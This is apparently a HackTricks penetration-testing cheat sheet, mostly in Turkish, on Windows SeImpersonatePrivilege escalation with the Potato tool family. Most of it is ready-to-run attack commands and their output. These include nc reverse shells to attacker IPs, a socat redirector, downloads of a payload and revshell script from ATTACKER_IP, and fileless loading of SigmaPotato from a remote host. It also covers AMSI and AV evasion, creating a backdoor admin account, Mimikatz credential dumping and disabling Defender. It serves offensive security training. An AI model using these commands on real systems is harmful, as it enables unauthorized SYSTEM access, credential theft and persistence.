# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato çalışmıyor** Windows Server 2019 ve Windows 10 build 1809 ve sonrası üzerinde. Ancak, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)**,** aynı ayrıcalıkları kullanmak ve `NT AUTHORITY\SYSTEM` düzeyinde erişim elde etmek için kullanılabilir. Bu [blog yazısı](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) `PrintSpoofer` aracını derinlemesine inceliyor; JuicyPotato'nun artık çalışmadığı Windows 10 ve Server 2019 makinelerinde impersonation ayrıcalıklarını nasıl kötüye kullanabileceğinizi anlatıyor.

> [!TIP]
> 2024–2025 yıllarında sıkça bakım yapılan modern bir alternatif SigmaPotato (GodPotato'dan bir fork) olup bellekte çalıştırma/.NET reflection kullanımı ve genişletilmiş işletim sistemi desteği ekler. Aşağıdaki hızlı kullanım örneğine ve Referanslar bölümündeki repoya bakın.

Related pages for background and manual techniques:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Requirements and common gotchas

Aşağıdaki tüm teknikler, aşağıdaki ayrıcalıklardan birine sahip bir bağlamdan impersonation yeteneğine sahip ayrıcalıklı bir servisin kötüye kullanılmasına dayanır:

- SeImpersonatePrivilege (en yaygın) veya SeAssignPrimaryTokenPrivilege
- High integrity gerekli değildir eğer token zaten SeImpersonatePrivilege içeriyorsa (IIS AppPool, MSSQL gibi birçok servis hesabı için tipiktir, vb.)

Ayrıcalıkları hızlıca kontrol edin:
```cmd
whoami /priv | findstr /i impersonate
```
Operasyon notları:

- Eğer shelliniz SeImpersonatePrivilege içermeyen kısıtlı bir token altında çalışıyorsa (bazı durumlarda Local Service/Network Service için yaygındır), hesabın varsayılan ayrıcalıklarını FullPowers ile geri alın, sonra bir Potato çalıştırın. Örnek: `FullPowers.exe -c "cmd /c whoami /priv" -z`
- PrintSpoofer, Print Spooler servisinin çalışıyor olmasını ve yerel RPC endpoint'ine (spoolss) erişilebilir olmasını gerektirir. PrintNightmare sonrası Spooler'ın devre dışı bırakıldığı sertleştirilmiş ortamlarda RoguePotato/GodPotato/DCOMPotato/EfsPotato'yu tercih edin.
- RoguePotato, TCP/135'te erişilebilir bir OXID resolver gerektirir. Çıkış trafiği (egress) engelliyse bir redirector/port-forwarder kullanın (aşağıdaki örneğe bakın). Eski sürümler -f bayrağına ihtiyaç duyuyordu.
- EfsPotato/SharpEfsPotato MS-EFSR'yi suiistimal eder; bir pipe engelliyse alternatif pipe'ları deneyin (lsarpc, efsrpc, samr, lsass, netlogon).
- RpcBindingSetAuthInfo sırasında 0x6d3 hatası genellikle bilinmeyen/desteklenmeyen bir RPC kimlik doğrulama servisine işaret eder; farklı bir pipe/transport deneyin veya hedef servisin çalıştığından emin olun.
- DeadPotato gibi "kitchen-sink" fork'lar ekstra payload modülleri (Mimikatz/SharpHound/Defender off) içerir ve diske dokunur; orijinal, ince sürümlere kıyasla daha yüksek EDR tespiti bekleyin.

## Quick Demo

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
Notlar:
- Mevcut konsolda interaktif bir süreç başlatmak için -i kullanın veya tek satırlık bir komut çalıştırmak için -c kullanın.
- Spooler servisi gereklidir. Devre dışıysa çalışmaz.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
Eğer outbound 135 engellenmişse, redirector'ınızda socat aracılığıyla OXID resolver'ı pivot edin:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### PrintNotifyPotato

PrintNotifyPotato, 2022 sonlarında yayımlanan daha yeni bir COM abuse primitive olup Spooler/BITS yerine **PrintNotify** servisini hedefler. Binary, PrintNotify COM server'ını başlatır, sahte bir `IUnknown` ile değiştirir ve ardından `CreatePointerMoniker` üzerinden ayrıcalıklı bir callback tetikler. PrintNotify servisi (**SYSTEM** olarak çalışan) geri bağlandığında süreç döndürülen token'ı çoğaltır ve sağlanan payload'ı tam ayrıcalıklarla çalıştırır.

Key operational notes:

* Print Workflow/PrintNotify servisi yüklü olduğu sürece Windows 10/11 ve Windows Server 2012–2022'de çalışır (legacy Spooler post-PrintNightmare sonrası devre dışı olsa bile bu servis mevcuttur).
* Çağıran bağlamın **SeImpersonatePrivilege** hakkına sahip olmasını gerektirir (IIS APPPOOL, MSSQL ve scheduled-task servis hesaplarında tipiktir).
* Doğrudan bir komut veya etkileşimli modu kabul eder, böylece orijinal konsolda kalabilirsiniz. Örnek:

```cmd
PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
PrintNotifyPotato.exe whoami
```

* Tamamen COM tabanlı olduğu için named-pipe dinleyicilerine veya dış yönlendiricilere gerek yoktur; bu da Defender'ın RoguePotato’nın RPC binding'ini engellediği hostlarda doğrudan kullanılabilecek bir ikame haline getirir.

Ink Dragon gibi operatörler, SharePoint'te ViewState RCE elde ettikten hemen sonra PrintNotifyPotato'yu çalıştırarak `w3wp.exe` worker'dan SYSTEM'e pivot yapar ve ardından ShadowPad'i kurar.

### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
İpucu: Eğer bir pipe başarısız olursa veya EDR bunu engellerse, diğer desteklenen pipe'ları deneyin:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
Notlar:
- SeImpersonatePrivilege mevcut olduğunda Windows 8/8.1–11 ve Server 2012–2022 genelinde çalışır.
- Yüklü runtime ile eşleşen binary'i alın (ör. modern Server 2022'de `GodPotato-NET4.exe`).
- Eğer başlangıç execution primitive'iniz kısa timeout'lara sahip bir webshell/UI ise, payload'ı bir script olarak stage edin ve uzun bir inline command yerine GodPotato'dan bunu çalıştırmasını isteyin.

Yazılabilir bir IIS webroot'undan hızlı staging pattern:
```powershell
iwr http://ATTACKER_IP/GodPotato-NET4.exe -OutFile gp.exe
iwr http://ATTACKER_IP/shell.ps1 -OutFile shell.ps1  # contains your revshell
./gp.exe -cmd "powershell -ep bypass C:\inetpub\wwwroot\shell.ps1"
```
### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato, varsayılan olarak RPC_C_IMP_LEVEL_IMPERSONATE olan servis DCOM nesnelerini hedefleyen iki varyant sağlar. Sağlanan binaries'i derleyin veya kullanın ve komutunuzu çalıştırın:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (güncellenmiş GodPotato fork)

SigmaPotato, .NET reflection aracılığıyla in-memory execution ve bir PowerShell reverse shell helper gibi modern kolaylıklar ekler.
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
Additional perks in 2024–2025 builds (v1.2.x):
- Yerleşik reverse shell bayrağı `--revshell` ve PowerShell'in 1024 karakter sınırının kaldırılması, böylece uzun AMSI-bypassing payload'larını tek seferde çalıştırabilirsiniz.
- Reflection uyumlu sözdizimi (`[SigmaPotato]::Main()`), ayrıca basit heuristikleri yanıltmak için `VirtualAllocExNuma()` ile ilkel bir AV evasion numarası.
- PowerShell Core ortamları için .NET 2.0'a karşı derlenmiş ayrı `SigmaPotatoCore.exe`.

### DeadPotato (2024 GodPotato yeniden düzenlemesi — modüllerle)

DeadPotato, GodPotato OXID/DCOM impersonation chain'i korur fakat post-exploitation yardımcılarını entegre ederek operatörlerin hemen SYSTEM elde edip persistence/collection gerçekleştirmesini sağlar; ek araçlara ihtiyaç kalmaz.

Common modules (all require SeImpersonatePrivilege):

- `-cmd "<cmd>"` — SYSTEM olarak rastgele bir komut başlatır.
- `-rev <ip:port>` — hızlı reverse shell.
- `-newadmin user:pass` — persistence için yerel bir admin oluşturur.
- `-mimi sam|lsa|all` — Mimikatz'ı diske bırakarak çalıştırıp kimlik bilgilerini dump eder (diske dokunur, gürültülü).
- `-sharphound` — SYSTEM olarak SharpHound collection çalıştırır.
- `-defender off` — Defender gerçek zamanlı korumasını kapatır (çok gürültülü).

Örnek tek satırlıklar:
```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```
Ek ikili dosyalar içerdiği için AV/EDR alarmlarının daha yüksek olmasını bekleyin; stealth önemliyse daha ince GodPotato/SigmaPotato'yu kullanın.

## Kaynaklar

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [FullPowers – Hizmet hesapları için varsayılan token ayrıcalıklarını geri yükleme](https://github.com/itm4n/FullPowers)
- [HTB: Media — WMP NTLM leak → NTFS junction ile webroot RCE → FullPowers + GodPotato ile SYSTEM'e](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [HTB: Job — LibreOffice makro → IIS webshell → GodPotato ile SYSTEM'e](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [Check Point Research – Inside Ink Dragon: Gizli bir saldırı operasyonunun relay ağı ve iç işleyişinin açığa çıkarılması](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [DeadPotato – GodPotato yeniden düzenlemesi; dahili post-ex modüller içerir](https://github.com/lypd0/DeadPotato)

{{#include ../../banners/hacktricks-training.md}}
